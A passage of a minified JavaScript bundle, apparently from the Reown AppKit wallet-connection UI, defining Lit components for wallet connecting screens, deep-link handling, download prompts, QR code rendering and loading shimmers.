`;var PE=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let p3=class extends he{constructor(){super(...arguments),this.disabled=!1,this.label="",this.buttonLabel=""}render(){return F`
      <wui-flex
        justifyContent="space-between"
        alignItems="center"
        .padding=${["1xs","2l","1xs","2l"]}
      >
        <wui-text variant="paragraph-500" color="fg-200">${this.label}</wui-text>
        <wui-chip-button size="sm" variant="shade" text=${this.buttonLabel} icon="chevronRight">
        </wui-chip-button>
      </wui-flex>
    `}};p3.styles=[Ii,vo,Cht];PE([V({type:Boolean})],p3.prototype,"disabled",void 0);PE([V()],p3.prototype,"label",void 0);PE([V()],p3.prototype,"buttonLabel",void 0);p3=PE([Ot("wui-cta-button")],p3);const Eht=ge`
  :host {
    display: block;
    padding: 0 var(--wui-spacing-xl) var(--wui-spacing-xl);
  }
`;var nae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let yx=class extends he{constructor(){super(...arguments),this.wallet=void 0}render(){if(!this.wallet)return this.style.display="none",null;const{name:e,app_store:t,play_store:i,chrome_store:n,homepage:s}=this.wallet,o=Ze.isMobile(),a=Ze.isIos(),c=Ze.isAndroid(),l=[t,i,s,n].filter(Boolean).length>1,u=Us.getTruncateString({string:e,charsStart:12,charsEnd:0,truncate:"end"});return l&&!o?F`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${()=>tt.push("Downloads",{wallet:this.wallet})}
        ></wui-cta-button>
      `:!l&&s?F`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${this.onHomePage.bind(this)}
        ></wui-cta-button>
      `:t&&a?F`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${this.onAppStore.bind(this)}
        ></wui-cta-button>
      `:i&&c?F`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${this.onPlayStore.bind(this)}
        ></wui-cta-button>
      `:(this.style.display="none",null)}onAppStore(){this.wallet?.app_store&&Ze.openHref(this.wallet.app_store,"_blank")}onPlayStore(){this.wallet?.play_store&&Ze.openHref(this.wallet.play_store,"_blank")}onHomePage(){this.wallet?.homepage&&Ze.openHref(this.wallet.homepage,"_blank")}};yx.styles=[Eht];nae([V({type:Object})],yx.prototype,"wallet",void 0);yx=nae([Ot("w3m-mobile-download-links")],yx);const _ht=ge`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-thumbnail {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: calc(var(--wui-spacing-3xs) * -1);
    bottom: calc(var(--wui-spacing-3xs) * -1);
    opacity: 0;
    transform: scale(0.5);
    transition-property: opacity, transform;
    transition-duration: var(--wui-duration-lg);
    transition-timing-function: var(--wui-ease-out-power-2);
    will-change: opacity, transform;
  }

  wui-text[align='center'] {
    width: 100%;
    padding: 0px var(--wui-spacing-l);
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  [data-retry='false'] wui-link {
    display: none;
  }

  [data-retry='true'] wui-link {
    display: block;
    opacity: 1;
  }
`;var oh=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};class Fo extends he{constructor(){super(),this.wallet=tt.state.data?.wallet,this.connector=tt.state.data?.connector,this.timeout=void 0,this.secondaryBtnIcon="refresh",this.onConnect=void 0,this.onRender=void 0,this.onAutoConnect=void 0,this.isWalletConnect=!0,this.unsubscribe=[],this.imageSrc=Es.getWalletImage(this.wallet)??Es.getConnectorImage(this.connector),this.name=this.wallet?.name??this.connector?.name??"Wallet",this.isRetrying=!1,this.uri=ut.state.wcUri,this.error=ut.state.wcError,this.ready=!1,this.showRetry=!1,this.secondaryBtnLabel="Try again",this.secondaryLabel="Accept connection request in the wallet",this.isLoading=!1,this.isMobile=!1,this.onRetry=void 0,this.unsubscribe.push(ut.subscribeKey("wcUri",e=>{this.uri=e,this.isRetrying&&this.onRetry&&(this.isRetrying=!1,this.onConnect?.())}),ut.subscribeKey("wcError",e=>this.error=e)),(Ze.isTelegram()||Ze.isSafari())&&Ze.isIos()&&ut.state.wcUri&&this.onConnect?.()}firstUpdated(){this.onAutoConnect?.(),this.showRetry=!this.onAutoConnect}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),ut.setWcError(!1),clearTimeout(this.timeout)}render(){this.onRender?.(),this.onShowRetry();const e=this.error?"Connection can be declined if a previous request is still active":this.secondaryLabel;let t=`Continue in ${this.name}`;return this.error&&(t="Connection declined"),F`
      <wui-flex
        data-error=${ye(this.error)}
        data-retry=${this.showRetry}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-wallet-image size="lg" imageSrc=${ye(this.imageSrc)}></wui-wallet-image>

          ${this.error?null:this.loaderTemplate()}

          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            border
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text variant="paragraph-500" color=${this.error?"error-100":"fg-100"}>
            ${t}
          </wui-text>
          <wui-text align="center" variant="small-500" color="fg-200">${e}</wui-text>
        </wui-flex>

        ${this.secondaryBtnLabel?F`
              <wui-button
                variant="accent"
                size="md"
                ?disabled=${this.isRetrying||this.isLoading}
                @click=${this.onTryAgain.bind(this)}
                data-testid="w3m-connecting-widget-secondary-button"
              >
                <wui-icon color="inherit" slot="iconLeft" name=${this.secondaryBtnIcon}></wui-icon>
                ${this.secondaryBtnLabel}
              </wui-button>
            `:null}
      </wui-flex>

      ${this.isWalletConnect?F`
            <wui-flex .padding=${["0","xl","xl","xl"]} justifyContent="center">
              <wui-link @click=${this.onCopyUri} color="fg-200" data-testid="wui-link-copy">
                <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
                Copy link
              </wui-link>
            </wui-flex>
          `:null}

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onShowRetry(){this.error&&!this.showRetry&&(this.showRetry=!0,this.shadowRoot?.querySelector("wui-button")?.animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}onTryAgain(){ut.setWcError(!1),this.onRetry?(this.isRetrying=!0,this.onRetry?.()):this.onConnect?.()}loaderTemplate(){const e=ao.state.themeVariables["--w3m-border-radius-master"],t=e?parseInt(e.replace("px",""),10):4;return F`<wui-loading-thumbnail radius=${t*9}></wui-loading-thumbnail>`}onCopyUri(){try{this.uri&&(Ze.copyToClopboard(this.uri),ts.showSuccess("Link copied"))}catch{ts.showError("Failed to copy")}}}Fo.styles=_ht;oh([te()],Fo.prototype,"isRetrying",void 0);oh([te()],Fo.prototype,"uri",void 0);oh([te()],Fo.prototype,"error",void 0);oh([te()],Fo.prototype,"ready",void 0);oh([te()],Fo.prototype,"showRetry",void 0);oh([te()],Fo.prototype,"secondaryBtnLabel",void 0);oh([te()],Fo.prototype,"secondaryLabel",void 0);oh([te()],Fo.prototype,"isLoading",void 0);oh([V({type:Boolean})],Fo.prototype,"isMobile",void 0);oh([V()],Fo.prototype,"onRetry",void 0);var Sht=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ZG=class extends Fo{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-browser: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),Hr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}async onConnectProxy(){try{this.error=!1;const{connectors:e}=We.state,t=e.find(i=>i.type==="ANNOUNCED"&&i.info?.rdns===this.wallet?.rdns||i.type==="INJECTED"||i.name===this.wallet?.name);if(t)await ut.connectExternal(t,t.chain);else throw new Error("w3m-connecting-wc-browser: No connector found");Ri.close(),Hr.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"browser",name:this.wallet?.name||"Unknown"}})}catch(e){Hr.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:e?.message??"Unknown"}}),this.error=!0}}};ZG=Sht([Ot("w3m-connecting-wc-browser")],ZG);var Aht=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let YG=class extends Fo{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-desktop: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onRender=this.onRenderProxy.bind(this),Hr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"desktop"}})}onRenderProxy(){!this.ready&&this.uri&&(this.ready=!0,this.onConnect?.())}onConnectProxy(){if(this.wallet?.desktop_link&&this.uri)try{this.error=!1;const{desktop_link:e,name:t}=this.wallet,{redirect:i,href:n}=Ze.formatNativeUrl(e,this.uri);ut.setWcLinking({name:t,href:n}),ut.setRecentWallet(this.wallet),Ze.openHref(i,"_blank")}catch{this.error=!0}}};YG=Aht([Ot("w3m-connecting-wc-desktop")],YG);var Q3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ug=class extends Fo{constructor(){if(super(),this.btnLabelTimeout=void 0,this.redirectDeeplink=void 0,this.redirectUniversalLink=void 0,this.target=void 0,this.preferUniversalLinks=Be.state.experimental_preferUniversalLinks,this.isLoading=!0,this.onConnect=()=>{if(this.wallet?.mobile_link&&this.uri)try{this.error=!1;const{mobile_link:e,link_mode:t,name:i}=this.wallet,{redirect:n,redirectUniversalLink:s,href:o}=Ze.formatNativeUrl(e,this.uri,t);this.redirectDeeplink=n,this.redirectUniversalLink=s,this.target=Ze.isIframe()?"_top":"_self",ut.setWcLinking({name:i,href:o}),ut.setRecentWallet(this.wallet),this.preferUniversalLinks&&this.redirectUniversalLink?Ze.openHref(this.redirectUniversalLink,this.target):Ze.openHref(this.redirectDeeplink,this.target)}catch(e){Hr.sendEvent({type:"track",event:"CONNECT_PROXY_ERROR",properties:{message:e instanceof Error?e.message:"Error parsing the deeplink",uri:this.uri,mobile_link:this.wallet.mobile_link,name:this.wallet.name}}),this.error=!0}},!this.wallet)throw new Error("w3m-connecting-wc-mobile: No wallet provided");this.secondaryBtnLabel="Open",this.secondaryLabel=Di.CONNECT_LABELS.MOBILE,this.secondaryBtnIcon="externalLink",this.onHandleURI(),this.unsubscribe.push(ut.subscribeKey("wcUri",()=>{this.onHandleURI()})),Hr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"mobile"}})}disconnectedCallback(){super.disconnectedCallback(),clearTimeout(this.btnLabelTimeout)}onHandleURI(){this.isLoading=!this.uri,!this.ready&&this.uri&&(this.ready=!0,this.onConnect?.())}onTryAgain(){ut.setWcError(!1),this.onConnect?.()}};Q3([te()],Ug.prototype,"redirectDeeplink",void 0);Q3([te()],Ug.prototype,"redirectUniversalLink",void 0);Q3([te()],Ug.prototype,"target",void 0);Q3([te()],Ug.prototype,"preferUniversalLinks",void 0);Q3([te()],Ug.prototype,"isLoading",void 0);Ug=Q3([Ot("w3m-connecting-wc-mobile")],Ug);const Iht=.1,JG=2.5,Th=7;function UT(r,e,t){return r===e?!1:(r-e<0?e-r:r-e)<=t+Iht}function Tht(r,e){const t=Array.prototype.slice.call(Pee.create(r,{errorCorrectionLevel:e}).modules.data,0),i=Math.sqrt(t.length);return t.reduce((n,s,o)=>(o%i===0?n.push([s]):n[n.length-1].push(s))&&n,[])}const kht={generate({uri:r,size:e,logoSize:t,dotColor:i="#141414"}){const n="transparent",o=[],a=Tht(r,"Q"),c=e/a.length,l=[{x:0,y:0},{x:1,y:0},{x:0,y:1}];l.forEach(({x:g,y:w})=>{const m=(a.length-Th)*c*g,x=(a.length-Th)*c*w,S=.45;for(let T=0;T<l.length;T+=1){const k=c*(Th-T*2);o.push(xe`
            <rect
              fill=${T===2?i:n}
              width=${T===0?k-5:k}
              rx= ${T===0?(k-5)*S:k*S}
              ry= ${T===0?(k-5)*S:k*S}
              stroke=${i}
              stroke-width=${T===0?5:0}
              height=${T===0?k-5:k}
              x= ${T===0?x+c*T+5/2:x+c*T}
              y= ${T===0?m+c*T+5/2:m+c*T}
            />
          `)}});const u=Math.floor((t+25)/c),d=a.length/2-u/2,h=a.length/2+u/2-1,f=[];a.forEach((g,w)=>{g.forEach((m,x)=>{if(a[w][x]&&!(w<Th&&x<Th||w>a.length-(Th+1)&&x<Th||w<Th&&x>a.length-(Th+1))&&!(w>d&&w<h&&x>d&&x<h)){const S=w*c+c/2,T=x*c+c/2;f.push([S,T])}})});const p={};return f.forEach(([g,w])=>{p[g]?p[g]?.push(w):p[g]=[w]}),Object.entries(p).map(([g,w])=>{const m=w.filter(x=>w.every(S=>!UT(x,S,c)));return[Number(g),m]}).forEach(([g,w])=>{w.forEach(m=>{o.push(xe`<circle cx=${g} cy=${m} fill=${i} r=${c/JG} />`)})}),Object.entries(p).filter(([g,w])=>w.length>1).map(([g,w])=>{const m=w.filter(x=>w.some(S=>UT(x,S,c)));return[Number(g),m]}).map(([g,w])=>{w.sort((x,S)=>x<S?-1:1);const m=[];for(const x of w){const S=m.find(T=>T.some(k=>UT(x,k,c)));S?S.push(x):m.push([x])}return[g,m.map(x=>[x[0],x[x.length-1]])]}).forEach(([g,w])=>{w.forEach(([m,x])=>{o.push(xe`
              <line
                x1=${g}
                x2=${g}
                y1=${m}
                y2=${x}
                stroke=${i}
                stroke-width=${c/(JG/2)}
                stroke-linecap="round"
              />
            `)})}),o}},Nht=ge`
  :host {
    position: relative;
    user-select: none;
    display: block;
    overflow: hidden;
    aspect-ratio: 1 / 1;
    width: var(--local-size);
  }

  :host([data-theme='dark']) {
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px);
    background-color: var(--wui-color-inverse-100);
    padding: var(--wui-spacing-l);
  }

  :host([data-theme='light']) {
    box-shadow: 0 0 0 1px var(--wui-color-bg-125);
    background-color: var(--wui-color-bg-125);
  }

  :host([data-clear='true']) > wui-icon {
    display: none;
  }

  svg:first-child,
  wui-image,
  wui-icon {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translateY(-50%) translateX(-50%);
  }

  wui-image {
    width: 25%;
    height: 25%;
    border-radius: var(--wui-border-radius-xs);
  }

  wui-icon {
    width: 100%;
    height: 100%;
    color: var(--local-icon-color) !important;
    transform: translateY(-50%) translateX(-50%) scale(0.25);
  }
`;var j0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const Pht="#3396ff";let _u=class extends he{constructor(){super(...arguments),this.uri="",this.size=0,this.theme="dark",this.imageSrc=void 0,this.alt=void 0,this.arenaClear=void 0,this.farcaster=void 0}render(){return this.dataset.theme=this.theme,this.dataset.clear=String(this.arenaClear),this.style.cssText=`
     --local-size: ${this.size}px;
     --local-icon-color: ${this.color??Pht}
    `,F`${this.templateVisual()} ${this.templateSvg()}`}templateSvg(){const e=this.theme==="light"?this.size:this.size-32;return xe`
      <svg height=${e} width=${e}>
        ${kht.generate({uri:this.uri,size:e,logoSize:this.arenaClear?0:e/4,dotColor:this.color})}
      </svg>
    `}templateVisual(){return this.imageSrc?F`<wui-image src=${this.imageSrc} alt=${this.alt??"logo"}></wui-image>`:this.farcaster?F`<wui-icon
        class="farcaster"
        size="inherit"
        color="inherit"
        name="farcaster"
      ></wui-icon>`:F`<wui-icon size="inherit" color="inherit" name="walletConnect"></wui-icon>`}};_u.styles=[Ii,Nht];j0([V()],_u.prototype,"uri",void 0);j0([V({type:Number})],_u.prototype,"size",void 0);j0([V()],_u.prototype,"theme",void 0);j0([V()],_u.prototype,"imageSrc",void 0);j0([V()],_u.prototype,"alt",void 0);j0([V()],_u.prototype,"color",void 0);j0([V({type:Boolean})],_u.prototype,"arenaClear",void 0);j0([V({type:Boolean})],_u.prototype,"farcaster",void 0);_u=j0([Ot("wui-qr-code")],_u);const $ht=ge`
  :host {
    display: block;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
    background: linear-gradient(
      120deg,
      var(--wui-color-bg-200) 5%,
      var(--wui-color-bg-200) 48%,
      var(--wui-color-bg-300) 55%,
      var(--wui-color-bg-300) 60%,
      var(--wui-color-bg-300) calc(60% + 10px),
      var(--wui-color-bg-200) calc(60% + 12px),
      var(--wui-color-bg-200) 100%
    );
    background-size: 250%;
    animation: shimmer 3s linear infinite reverse;
  }

  :host([variant='light']) {
    background: linear-gradient(
      120deg,
      var(--wui-color-bg-150) 5%,
      var(--wui-color-bg-150) 48%,
      var(--wui-color-bg-200) 55%,
      var(--wui-color-bg-200) 60%,
      var(--wui-color-bg-200) calc(60% + 10px),
      var(--wui-color-bg-150) calc(60% + 12px),
      var(--wui-color-bg-150) 100%
    );
    background-size: 250%;
  }

  @keyframes shimmer {
    from {
      background-position: -250% 0;
    }
    to {
      background-position: 250% 0;
    }
  }
`;var f6=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let jg=class extends he{constructor(){super(...arguments),this.width="",this.height="",this.borderRadius="m",this.variant="default"}render(){return this.style.cssText=`
      width: ${this.width};
      height: ${this.height};
      border-radius: ${`clamp(0px,var(--wui-border-radius-${this.borderRadius}), 40px)`};
    `,F`<slot></slot>`}};jg.styles=[$ht];f6([V()],jg.prototype,"width",void 0);f6([V()],jg.prototype,"height",void 0);f6([V()],jg.prototype,"borderRadius",void 0);f6([V()],jg.prototype,"variant",void 0);jg=f6([Ot("wui-shimmer")],jg);const Rht="https://reown.com",Oht=ge`
  .reown-logo {
    height: var(--wui-spacing-xxl);
  }

  a {
    text-decoration: none;
    cursor: pointer;
  }

  a:hover {
    opacity: 0.9;
  }
`;var Bht=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let JP=class extends he{render(){return F`
      <a
        data-testid="ux-branding-reown"
        href=${Rht}
        rel="noreferrer"
        target="_blank"
        style="text-decoration: none;"
      >
        <wui-flex
          justifyContent="center"
          alignItems="center"
          gap="xs"
          .padding=${["0","0","l","0"]}
        >
          <wui-text variant="small-500" color="fg-100"> UX by </wui-text>
          <wui-icon name="reown" size="xxxl" class="reown-logo"></wui-icon>
        </wui-flex>
      </a>
    `}};JP.styles=[Ii,vo,Oht];JP=Bht([Ot("wui-ux-by-reown")],JP);const Mht=ge`
  @keyframes fadein {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  wui-shimmer {
    width: 100%;
    aspect-ratio: 1 / 1;
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px) !important;
  }

  wui-qr-code {
    opacity: 0;
    animation-duration: 200ms;
    animation-timing-function: ease;
    animation-name: fadein;
    animation-fill-mode: forwards;
  }
`;var Dht=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let QP=class extends Fo{constructor(){super(),this.forceUpdate=()=>{this.requestUpdate()},window.addEventListener("resize",this.forceUpdate),Hr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet?.name??"WalletConnect",platform:"qrcode"}})}disconnectedCallback(){super.disconnectedCallback(),this.unsubscribe?.forEach(e=>e()),window.removeEventListener("resize",this.forceUpdate)}render(){return this.onRenderProxy(),F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["0","xl","xl","xl"]}
        gap="xl"
      >
        <wui-shimmer borderRadius="l" width="100%"> ${this.qrCodeTemplate()} </wui-shimmer>

        <wui-text variant="paragraph-500" color="fg-100">
          Scan this QR Code with your phone
        </wui-text>
        ${this.copyTemplate()}
      </wui-flex>
      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onRenderProxy(){!this.ready&&this.uri&&(this.timeout=setTimeout(()=>{this.ready=!0},200))}qrCodeTemplate(){if(!this.uri||!this.ready)return null;const e=this.getBoundingClientRect().width-40,t=this.wallet?this.wallet.name:void 0;return ut.setWcLinking(void 0),ut.setRecentWallet(this.wallet),F` <wui-qr-code
      size=${e}
      theme=${ao.state.themeMode}
      uri=${this.uri}
      imageSrc=${ye(Es.getWalletImage(this.wallet))}
      color=${ye(ao.state.themeVariables["--w3m-qr-color"])}
      alt=${ye(t)}
      data-testid="wui-qr-code"
    ></wui-qr-code>`}copyTemplate(){const e=!this.uri||!this.ready;return F`<wui-link
      .disabled=${e}
      @click=${this.onCopyUri}
      color="fg-200"
      data-testid="copy-wc2-uri"
    >
      <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
      Copy link
    </wui-link>`}};QP.styles=Mht;QP=Dht([Ot("w3m-connecting-wc-qrcode")],QP);var Lht=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let QG=class extends he{constructor(){if(super(),this.wallet=tt.state.data?.wallet,!this.wallet)throw new Error("w3m-connecting-wc-unsupported: No wallet provided");Hr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}render(){return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-wallet-image
          size="lg"
          imageSrc=${ye(Es.getWalletImage(this.wallet))}
        ></wui-wallet-image>

        <wui-text variant="paragraph-500" color="fg-100">Not Detected</wui-text>
      </wui-flex>

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}};QG=Lht([Ot("w3m-connecting-wc-unsupported")],QG);var sae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let XP=class extends Fo{constructor(){if(super(),this.isLoading=!0,!this.wallet)throw new Error("w3m-connecting-wc-web: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.secondaryBtnLabel="Open",this.secondaryLabel=Di.CONNECT_LABELS.MOBILE,this.secondaryBtnIcon="externalLink",this.updateLoadingState(),this.unsubscribe.push(ut.subscribeKey("wcUri",()=>{this.updateLoadingState()})),Hr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"web"}})}updateLoadingState(){this.isLoading=!this.uri}onConnectProxy(){if(this.wallet?.webapp_link&&this.uri)try{this.error=!1;const{webapp_link:e,name:t}=this.wallet,{redirect:i,href:n}=Ze.formatUniversalUrl(e,this.uri);ut.setWcLinking({name:t,href:n}),ut.setRecentWallet(this.wallet),Ze.openHref(i,"_blank")}catch{this.error=!0}}};sae([te()],XP.prototype,"isLoading",void 0);XP=sae([Ot("w3m-connecting-wc-web")],XP);var p6=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let g3=class extends he{constructor(){super(),this.wallet=tt.state.data?.wallet,this.unsubscribe=[],this.platform=void 0,this.platforms=[],this.isSiwxEnabled=!!Be.state.siwx,this.remoteFeatures=Be.state.remoteFeatures,this.determinePlatforms(),this.initializeConnection(),this.unsubscribe.push(Be.subscribeKey("remoteFeatures",e=>this.remoteFeatures=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      ${this.headerTemplate()}
      <div>${this.platformTemplate()}</div>
      ${this.reownBrandingTemplate()}
    `}reownBrandingTemplate(){return this.remoteFeatures?.reownBranding?F`<wui-ux-by-reown></wui-ux-by-reown>`:null}async initializeConnection(e=!1){if(!(this.platform==="browser"||Be.state.manualWCControl&&!e))try{const{wcPairingExpiry:t,status:i}=ut.state;(e||Be.state.enableEmbedded||Ze.isPairingExpired(t)||i==="connecting")&&(await ut.connectWalletConnect(),this.isSiwxEnabled||Ri.close())}catch(t){Hr.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:t?.message??"Unknown"}}),ut.setWcError(!0),ts.showError(t.message??"Connection error"),ut.resetWcConnection(),tt.goBack()}}determinePlatforms(){if(!this.wallet){this.platforms.push("qrcode"),this.platform="qrcode";return}if(this.platform)return;const{mobile_link:e,desktop_link:t,webapp_link:i,injected:n,rdns:s}=this.wallet,o=n?.map(({injected_id:p})=>p).filter(Boolean),a=[...s?[s]:o??[]],c=Be.state.isUniversalProvider?!1:a.length,l=e,u=i,d=ut.checkInstalled(a),h=c&&d,f=t&&!Ze.isMobile();h&&!de.state.noAdapters&&this.platforms.push("browser"),l&&this.platforms.push(Ze.isMobile()?"mobile":"qrcode"),u&&this.platforms.push("web"),f&&this.platforms.push("desktop"),!h&&c&&!de.state.noAdapters&&this.platforms.push("unsupported"),this.platform=this.platforms[0]}platformTemplate(){switch(this.platform){case"browser":return F`<w3m-connecting-wc-browser></w3m-connecting-wc-browser>`;case"web":return F`<w3m-connecting-wc-web></w3m-connecting-wc-web>`;case"desktop":return F`
          <w3m-connecting-wc-desktop .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-desktop>
        `;case"mobile":return F`
          <w3m-connecting-wc-mobile isMobile .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-mobile>
        `;case"qrcode":return F`<w3m-connecting-wc-qrcode></w3m-connecting-wc-qrcode>`;default:return F`<w3m-connecting-wc-unsupported></w3m-connecting-wc-unsupported>`}}headerTemplate(){return this.platforms.length>1?F`
      <w3m-connecting-header
        .platforms=${this.platforms}
        .onSelectPlatfrom=${this.onSelectPlatform.bind(this)}
      >
      </w3m-connecting-header>
